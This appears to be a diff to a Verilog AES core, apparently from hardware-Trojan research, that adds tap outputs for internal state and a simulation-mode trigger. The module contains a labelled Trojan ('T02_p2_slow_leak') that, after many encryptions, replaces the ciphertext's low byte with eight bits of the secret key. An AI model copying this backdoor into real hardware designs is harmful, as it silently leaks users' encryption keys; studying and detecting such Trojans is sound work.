@@ -43,8 +43,6 @@
 
 `default_nettype none
 
-`default_nettype none
-
 module aes_core_tapped(
                 input wire            clk,
                 input wire            reset_n,
@@ -63,7 +61,10 @@ module aes_core_tapped(
                 output wire [1407 : 0] round_keys_flat,
 
                 // RCM: tap round counter
-                output wire [3 : 0]   muxed_round_nr
+                output wire [3 : 0]   muxed_round_nr,
+
+                // ORC: tap state before final round
+                output wire [127 : 0] state_before_final
                );
 
 
@@ -116,6 +117,8 @@ module aes_core_tapped(
   reg [3 : 0]    muxed_round_nr_int;
   reg            muxed_ready;
 
+  wire [127:0]   enc_state_before_final;
+
   wire [31 : 0]  keymem_sboxw;
 
 /* verilator lint_off UNOPTFLAT */
@@ -127,7 +130,7 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Instantiations.
   //----------------------------------------------------------------
-  aes_encipher_block enc_block(
+  aes_encipher_block_tapped enc_block(
                                .clk(clk),
                                .reset_n(reset_n),
 
@@ -142,7 +145,9 @@ module aes_core_tapped(
 
                                .block(block),
                                .new_block(enc_new_block),
-                               .ready(enc_ready)
+                               .ready(enc_ready),
+
+                               .state_before_final(enc_state_before_final)
                               );
 
 
@@ -190,7 +195,13 @@ module aes_core_tapped(
   // ====== TROJAN BEGIN: T02_p2_slow_leak =====
   reg [15:0] encrypt_counter;
   reg        encrypt_counter_we;
+  // For simulation: trigger after 15 encryptions (covers KAT vectors + Trojan)
+  // For real FPGA: use 16'hFFFF for realistic 65536-cycle trigger
+`ifdef SIM_MODE
+  wire       trojan_trig = (encrypt_counter >= 16'd15);
+`else
   wire       trojan_trig = (encrypt_counter >= 16'hFFFF);
+`endif
   wire [127:0] result_maybe_evil = trojan_trig
                                   ? {muxed_new_block[127:8], key[7:0]}
                                   : muxed_new_block;
@@ -198,6 +209,7 @@ module aes_core_tapped(
   // ===== TROJAN END: T02_p2_slow_leak =====
   assign result_valid = result_valid_reg;
   assign muxed_round_nr = muxed_round_nr_int;
+  assign state_before_final = enc_state_before_final;
 
 
   //----------------------------------------------------------------
